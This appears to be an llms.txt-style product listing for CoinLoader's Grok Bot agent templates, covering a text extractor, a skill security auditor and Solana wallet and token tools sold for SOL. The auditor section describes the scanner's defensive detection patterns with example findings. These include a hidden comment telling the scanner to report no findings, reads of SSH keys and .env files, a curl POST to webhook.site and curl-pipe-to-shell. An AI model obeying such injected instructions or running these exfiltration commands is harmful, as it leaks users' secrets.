# CoinLoader.com — Crypto, Solana & Security Agent Templates for Grok Bot

> Instant, one-click crypto, Solana, security, and web agent templates that execute locally inside your isolated Grok Bot Linux container (`/workspace`). Non-custodial, zero monthly subscriptions, and powered by the WattCoin Agent Registry (`https://www.wattcoin.org/llms.txt`).

- **Canonical Storefront:** https://coinloader.com/

## 1. Live Templates (Available Now — 9 Live Agents)

### 1.1 Web & API Text Extractor (FREE + 100 WATT Starter Grant)
- **Status:** LIVE NOW (Free)
- **Direct Import Link:** https://x.ai/bot/k1oyHmw4iS4VBW1U8_3Ol
- **Template ID:** `k1oyHmw4iS4VBW1U8_3Ol`
- **Included Skills:** `getting-started`, `web-extractor`
- **Capabilities:**
  1. **Turn-1 Auto-Onboarding (`getting-started`):** Registers a workspace agent identity via `POST https://www.wattcoin.org/api/v1/agents/register`, writes `WATTCOIN_AGENT_ID` and `WATTCOIN_AGENT_KEY` (`wck_...`) to `/workspace/.wattcoin_env` with `0600` permissions, and completes `onboarding_v1` (25 WATT) + `starter_v1` (75 WATT) for **100 WATT** total.
  2. **10/Day Free Text Extraction (`web-extractor`):** Calls `POST https://www.wattcoin.org/api/v1/scrape` (`format: "text"`) using static HTTP fetch + BeautifulSoup readable text extraction and reports `X-Quota-Limit` / `X-Quota-Remaining`.
  3. **Paid Modes & Local Fallback:** Supports 100 WATT/call `html` and `json` modes (never spends WATT without explicit user confirmation) and falls back to local `curl` + Python HTML-to-text in `/workspace` when daily quota is exhausted.

### 1.2 Bot & Skill Security Auditor ($29 One-Time in SOL)
- **Status:** LIVE NOW ($29 USD settled on-chain in SOL via CoinLoader.com or BotAppStore.com checkout modal)
- **Deliverable:** *See every network call, credential read, and shell command in a third-party skill, with line numbers, before you run it.*
- **SKU Identifier:** `bot-skill-auditor`
- **Product Page URL:** https://coinloader.com/bots/bot-skill-auditor.html
- **Included Skills:** `auditor-setup`, `bot-skill-auditor`
- **Checkout & Licensing Flow:**
  1. **Request Quote:** `POST https://www.wattcoin.org/api/v1/agents/license/quote` with `{"sku": "bot-skill-auditor"}` returns a 15-minute SOL quote (`order_id`, `checkout_token`, `amount_sol`, `amount_lamports` with a unique 4-digit lamport tag, `memo: "wcl:<order_id>"`, and official treasury wallet `Atu5phbGGGFogbKhi259czz887dSdTfXwJxwbuE5aF5q`).
  2. **Verify Payment & Issue License:** `POST https://www.wattcoin.org/api/v1/agents/license/purchase` with `{"order_id", "checkout_token", "tx_signature"}` verifies the Solana transfer on-chain (`confirmed` commitment) and returns the private Grok Bot template URL + one-time `wcl_<64-hex>` license code.
  3. **Turn-1 Binding (`auditor-setup`):** Installs read-only helpers `/workspace/.wattcoin_license_check.py` and `/workspace/.wattcoin_audit_prep.py` (`0500`), registers/activates `/workspace/.wattcoin_env` (`0600`), and binds the `wcl_...` license via `POST https://www.wattcoin.org/api/v1/agents/license/claim` (supports up to 3 workspace-reset rebinds).
  4. **5-Bucket Static Inspection (`bot-skill-auditor`):** Wraps untrusted artifacts in random `<untrusted_artifact_<16-hex>>` tags and reports verbatim line-cited findings across:
     - Bucket 1: Prompt, confirmation & auditor bypass (e.g., `crypto-airdrop-helper/SKILL.md:L14` hidden HTML comment instructing the scanner to report 0 findings)
     - Bucket 2: Secret, filesystem, self-modification & OS persistence access (e.g., `L29` reading `~/.ssh/id_ed25519` and `/workspace/.env`)
     - Bucket 3: Outbound network, exfiltration & MCP connectors (e.g., `L31` `curl -X POST https://webhook.site/...` paired with `L29` as a combined exfiltration path `L29 -> L31`)
     - Bucket 4: Unverifiable runtime execution & obfuscation (`curl | sh`, unpinned `npx`/`pip`, base64/hex payloads)
     - Bucket 5: Local machine escalation (`ListMachines`, `machineId`, `CopyToBox` / `CopyFromBox`)
  5. **Audit Coverage Accounting (`SCOPE_NOTE.txt`):** Prepends verbatim `SCOPE_NOTE.txt` and reports exact `Files Audited (N/M)` and `Files Skipped / Unread Portions` (plus `hidden_unicode_lines` and `long_lines`) at the top of every report.
  6. **What This Static Audit Does Not Catch:** Static inspection flags and cites lines present in the files at audit time (`Files Audited` / `Files Skipped`). It never proves a skill is safe, never outputs a "Safe/Pass" badge or numeric grade, and cannot catch payloads fetched dynamically at runtime, multi-stage remote API responses, time-bombed/state-gated logic, or off-file author/account compromise.

### 1.3 Solana Wallet Hygiene Bot ($19 One-Time in SOL)
- **Status:** LIVE NOW ($19 USD settled on-chain in SOL via CoinLoader.com or BotAppStore.com checkout modal)
- **Deliverable:** *Find the rent locked in empty token accounts and stale delegations on your wallet, then reclaim it yourself non-custodially.*
- **SKU Identifier:** `solana-wallet-hygiene`
- **Alternate / Registry Name:** Solana Wallet Hygiene & Rent Reclaim
- **Product Page URL:** https://coinloader.com/bots/solana-wallet-hygiene.html
- **Included Skills:** `wallet-hygiene-setup`, `solana-wallet-hygiene`
- **Storefront Checkout URL:** https://coinloader.com/#card-solana-wallet-hygiene
- **Checkout & Licensing Flow:**
  1. **Request Quote:** `POST https://www.wattcoin.org/api/v1/agents/license/quote` with `{"sku": "solana-wallet-hygiene", "source": "coinloader"}` returns a 15-minute SOL quote for `$19.00 USD` (`order_id`, `checkout_token`, `amount_sol`, `amount_lamports` with a unique 4-digit lamport tag, `memo: "wcl:<order_id>"`, and treasury wallet `Atu5phbGGGFogbKhi259czz887dSdTfXwJxwbuE5aF5q`).
  2. **Verify Payment & Issue License:** `POST https://www.wattcoin.org/api/v1/agents/license/purchase` with `{"sku": "solana-wallet-hygiene", "order_id", "checkout_token", "tx_signature"}` verifies the Solana transfer on-chain (`confirmed` commitment) and returns the private Grok Bot template URL + one-time `wcl_<64-hex>` license code.
  3. **Turn-1 Binding:** Registers/activates `/workspace/.wattcoin_env` (`0600`) and binds the `wcl_...` license via `POST https://www.wattcoin.org/api/v1/agents/license/claim` (up to 3 workspace-reset rebinds); entitlement check is `GET https://www.wattcoin.org/api/v1/agents/license?sku=solana-wallet-hygiene` -> `"sku_licensed": true`.
  4. **3-Bucket Report (`solana-wallet-hygiene`):** Scans legacy SPL (`Tokenkeg...`) and Token-2022 (`TokenzQd...`) accounts and classifies each as:
     - `SAFE_TO_RECLAIM`: empty accounts, no delegate, not frozen — exact rent of `0.00203928 SOL` (`2,039,280 lamports`) per standard SPL account
     - `NEEDS_CONFIRMATION`: active delegate / non-zero dust, confirmed one-by-one
     - `DO_NOT_TOUCH`: active balances, LP receipts, NFTs, frozen accounts, unharvested Token-2022 fees
  5. **Non-Custodial Reclaim Commands:** Phantom / Solflare steps and `spl-token close-account` / `spl-token revoke` CLI commands; the user signs everything.
  6. **Guardrails:** Never asks for a seed phrase or private key (refuses if pasted), never signs or broadcasts transactions.

### 1.4 Retail Token Due-Diligence Bot ($29 One-Time in SOL)
- **Status:** LIVE NOW ($29 USD settled on-chain in SOL via CoinLoader.com or BotAppStore.com checkout modal)
- **Deliverable:** *Verifiable, timestamped on-chain facts for any Solana mint — mechanics, not motives.*
- **SKU Identifier:** `solana-token-scanner`
- **Alternate / Registry Name:** Solana Token & Mint Due-Diligence Scanner
- **Product Page URL:** https://coinloader.com/bots/solana-token-scanner.html
- **Included Skills:** `solana-token-scanner-setup`, `solana-token-scanner`
- **Storefront Checkout URL:** https://coinloader.com/#card-solana-token-scanner
- **Checkout & Licensing Flow:**
  1. **Request Quote:** `POST https://www.wattcoin.org/api/v1/agents/license/quote` with `{"sku": "solana-token-scanner", "source": "coinloader"}` returns a 15-minute SOL quote for `$29.00 USD` (`order_id`, `checkout_token`, `amount_sol`, `amount_lamports` with a unique 4-digit lamport tag, `memo: "wcl:<order_id>"`, and treasury wallet `Atu5phbGGGFogbKhi259czz887dSdTfXwJxwbuE5aF5q`).
  2. **Verify Payment & Issue License:** `POST https://www.wattcoin.org/api/v1/agents/license/purchase` with `{"sku": "solana-token-scanner", "order_id", "checkout_token", "tx_signature"}` verifies the Solana transfer on-chain (`confirmed` commitment) and returns the private Grok Bot template URL + one-time `wcl_<64-hex>` license code.
  3. **Turn-1 Binding:** Registers/activates `/workspace/.wattcoin_env` (`0600`) and binds the `wcl_...` license via `POST https://www.wattcoin.org/api/v1/agents/license/claim` (up to 3 workspace-reset rebinds); entitlement check is `GET https://www.wattcoin.org/api/v1/agents/license?sku=solana-token-scanner` -> `"sku_licensed": true`.
  4. **5-Section Report (`solana-token-scanner`):**
     - Section 1: Mint & Program Identity
     - Section 2: Authority & Token-2022 Extension Controls (`TransferFeeConfig`, `PermanentDelegate`, `TransferHook`, `DefaultAccountState`)
     - Section 3: Top-20 Holder Concentration (`getTokenLargestAccounts`)
     - Section 4: DEX Liquidity & Pair Snapshot (DexScreener)
     - Section 5: Mandatory Non-Advice Scope Note
  5. **Guardrails:** Never outputs "safe/unsafe", "legit", "scam", or "rug" labels and never assigns a numerical score; every metric cites its RPC call, slot/timestamp, or API source.
